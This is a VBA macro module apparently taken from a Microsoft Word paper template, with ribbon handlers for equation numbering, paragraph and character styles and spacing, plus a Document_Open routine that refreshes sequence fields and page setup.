Dim objPara     As Paragraph
Dim objSelRange As Range

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Add equation counter"
    With Selection
       'Add the counter to equations
       If .Style Is Nothing Then
          Err.Raise ERR_USRMSG, , "Please format the selected paragraph(s) with the ""equation"" style first!"
       ElseIf .Style <> ActiveDocument.Styles("equation") Then
          Err.Raise ERR_USRMSG, , "Please format the selected paragraph(s) with the ""equation"" style first!"
       End If
       'Check for an existing equation counter
       For Each objField In .Paragraphs(1).Range.Fields
          If InStr(1, objField.Code, "SEQ ""equation"" \n") > 0 Then
             .Collapse wdCollapseEnd
             Err.Raise ERR_CANCEL
          End If
       Next
       Set objSelRange = .Range
       For Each objPara In objSelRange.Paragraphs
          .Start = objPara.Range.End - 1
          .End = objPara.Range.End - 1
          .Style = wdStyleDefaultParagraphFont
          .TypeText vbTab & "("
          .Fields.Add .Range, wdFieldEmpty, "SEQ ""equation"" \n", True
          .TypeText ")"
       Next
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (AddEqCounter): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeProgCode(control As IRibbonControl)
Dim ur  As UndoRecord

    On Error Resume Next
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'programcode' style"
    ApplyParaStyle "programcode", 0, True
    ur.EndCustomRecord

End Sub

Private Function ApplyParaStyle(ByVal StyleName As String, ByVal BuiltInStyleID As Integer, ByVal booMultiPara As Boolean) As Boolean
'Applies a paragraph style to the current selection
'- If the booMultiPara flag is not active, the function is cancelled for multi-paragraph selections
'- Set the cursor to the beginning of the current paragraph
Dim objStyle As Style

    On Error Resume Next
    If BuiltInStyleID <> 0 Then
       Set objStyle = ActiveDocument.Styles(BuiltInStyleID)
    Else
       Set objStyle = ActiveDocument.Styles(StyleName)
    End If
    On Error GoTo ERROR_HANDLER
    If objStyle Is Nothing Then
       Err.Raise ERR_USRMSG, , "The predefined paragraph style '" & StyleName & "' could not be found in the template." & vbCrLf & _
                               "Please use the 'Check Styles' button in the custom ribbon to restore deleted styles!"
    End If
    If objStyle.Type <> wdStyleTypeParagraph Then Exit Function
    With Selection
       'check whether text is highlighted
       If .Start <> .End Then
          'some text is selected
          If (.End > .Paragraphs(1).Range.End) Then
             'multiple paragraphs are selected
             If Not booMultiPara Then
                'if not supported, cancel
                Err.Raise ERR_USRMSG, , "This function is not available, if more than one paragraph is selected!"
             End If
          End If
       End If
       .ParagraphFormat.Style = objStyle
       'collapse the selection
       .Collapse wdCollapseStart
       'go up, if the cursor is not at the beginning of the paragraph
       If .Start > .Paragraphs(1).Range.Start Then
          .MoveUp wdParagraph, 1
       End If
    End With
    ApplyParaStyle = True
    Exit Function

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (ApplyParaStyle): " & Err.Description, vbCritical, C_TITLE
End If
End Function

Private Function ApplyCharStyle(ByVal StyleName As String, ByVal BuiltInStyleID As Integer) As Boolean
'Applies a character style to the current selection
'If there is no highlighted selection, expand it, until the next space of paragraph is found
Dim objStyle As Style

    On Error Resume Next
    If BuiltInStyleID <> 0 Then
       Set objStyle = ActiveDocument.Styles(BuiltInStyleID)
    Else
       Set objStyle = ActiveDocument.Styles(StyleName)
    End If
    On Error GoTo ERROR_HANDLER
    If objStyle Is Nothing Then
       Err.Raise ERR_USRMSG, , "The predefined character style '" & StyleName & "' could not be found in the template." & vbCrLf & _
                               "Please use the 'Check Styles' button in the custom ribbon to restore deleted styles!"
    End If
    If objStyle.Type <> wdStyleTypeCharacter Then Exit Function
    With Selection
       'if no text is highlighted, expand the selection up to the next space or paragraph
       If .Start = .End Then
          .MoveStartUntil " " & vbCrLf, wdBackward
          .MoveEndUntil " " & vbCrLf, wdForward
       End If
       .Style = objStyle
    End With
    ApplyCharStyle = True
    Exit Function

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (ApplyCharStyle): " & Err.Description, vbCritical, C_TITLE
End If
End Function

Public Sub NormalSpacing(control As IRibbonControl)
Dim ur                      As UndoRecord
Dim objPara                 As Paragraph
Dim strStyle                As String
Dim booChange               As Boolean
Dim booSqueezed             As Boolean

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Restore paragraph spacing"
    For Each objPara In Selection.Paragraphs
       If Not objPara.Style Is Nothing Then
          'Consider special spacing, if a following paragraph exists
          Select Case objPara.Style
             Case "papertitle"
                If Not objPara.Next Is Nothing Then
                   If objPara.Next.Style = "papersubtitle" Then
                      objPara.SpaceAfter = 0
                   End If
                End If
             Case "abstract"
                If Not objPara.Next Is Nothing Then
                   If objPara.Next.Style = "keywords" Then
                      objPara.SpaceAfter = 0
                   End If
                End If
             Case "bulletitem", "dashitem"
                If Not objPara.Next Is Nothing Then
                   If objPara.Next.Style = "numitem" Then
                      objPara.SpaceAfter = 0
                   End If
                End If
             Case "numitem"
                If Not objPara.Next Is Nothing Then
                   If (objPara.Next.Style = "bulletitem") Or (objPara.Next.Style = "dashitem") Then
                      objPara.SpaceAfter = 0
                   End If
                End If
             Case "heading2"
                If Not objPara.Previous Is Nothing Then
                   If (objPara.Previous.Style = "heading1") Then
                      objPara.SpaceBefore = 0
                   End If
                End If
             Case "heading3"
                If Not objPara.Previous Is Nothing Then
                   If (objPara.Previous.Style = "heading1") Or (objPara.Previous.Style = "heading2") Then
                      objPara.SpaceBefore = 0
                   End If
                End If
             Case "heading4"
                If Not objPara.Previous Is Nothing Then
                   If (objPara.Previous.Style = "heading1") Or (objPara.Previous.Style = "heading2") Or (objPara.Previous.Style = "heading3") Then
                      objPara.SpaceBefore = 0
                   End If
                End If
             Case Else
                'Default spacing
                objPara.SpaceAfter = objPara.Style.ParagraphFormat.SpaceAfter
                objPara.SpaceBefore = objPara.Style.ParagraphFormat.SpaceBefore
          End Select
          'Restore line spacing
          objPara.LineSpacingRule = objPara.Style.ParagraphFormat.LineSpacingRule
          objPara.LineSpacing = objPara.Style.ParagraphFormat.LineSpacing
       End If
    Next
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (NormalSpacing): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub RestoreSettings(control As IRibbonControl)

    RestorePageSetup
    CheckEnsureStyles

End Sub


Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Option Explicit

Private Sub Document_Open()
Dim ur  As UndoRecord
Dim objField  As Field

    On Error Resume Next
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Update all fields"
    'Update fields
    For Each objField In ActiveDocument.Fields
       If objField.Type = wdFieldSequence Then
          objField.Update
       End If
    Next
    ur.EndCustomRecord
    'If no other change is made (except for updating the fields), allow closing without saving
    ActiveDocument.Saved = True
    'Check for standard page setup
    RestorePageSetup
    
End Sub


INQUEST-PP=macro
